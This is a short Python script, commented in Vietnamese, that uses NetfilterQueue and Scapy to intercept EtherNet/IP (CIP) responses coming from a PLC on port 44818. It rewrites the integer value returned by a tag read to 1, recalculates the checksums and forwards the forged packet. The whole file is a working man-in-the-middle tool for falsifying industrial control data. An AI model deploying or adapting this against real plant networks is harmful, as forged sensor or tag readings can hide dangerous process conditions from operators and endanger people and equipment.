from netfilterqueue import NetfilterQueue
from scapy.all import *

def modify_packet(packet):
    scapy_pkt = IP(packet.get_payload())  # Chuyển gói tin sang định dạng Scapy
    
    if scapy_pkt.haslayer(TCP) and scapy_pkt[TCP].sport == 44818:  # ENIP Response
        data = bytes(scapy_pkt[TCP].payload)
        if data[0:2] == b"\x6f\x00":  # Kiểm tra ENIP Send RR Data
            # Kiểm tra cấu trúc ENIP + CIP
            if data[30:32] == b"\x02\x00" and data[32:34] == b"\x00\x00" and \
               data[34:36] == b"\x00\x00" and data[36:38] == b"\xb2\x00":
                # CIP packet bắt đầu tại offset 40
                if data[40:42] == b"\xcc\x00" and data[42:44] == b"\x00\x00":
                    if data[44:46] == b"\xc3\x00":  # INT datatype
                        print("Modifying CIP INT data...")
                        # Sửa đổi giá trị INT tại offset 46
                        modified_data = data[:46] + b"\x01\x00" + data[48:]
                        scapy_pkt[TCP].remove_payload()
                        scapy_pkt = scapy_pkt / modified_data
                        del scapy_pkt[IP].chksum  # Xóa checksum IP
                        del scapy_pkt[TCP].chksum  # Xóa checksum TCP
                        packet.set_payload(bytes(scapy_pkt))  # Cập nhật gói tin
    packet.accept()  # Chấp nhận gói tin và gửi đi

# Gắn hàng đợi NetfilterQueue
nfqueue = NetfilterQueue()
nfqueue.bind(1, modify_packet)  # Sử dụng hàng đợi số 1

try:
    print("Starting NetfilterQueue...")
    nfqueue.run()  # Chạy hàng đợi
except KeyboardInterrupt:
    print("Exiting...")
    nfqueue.unbind()
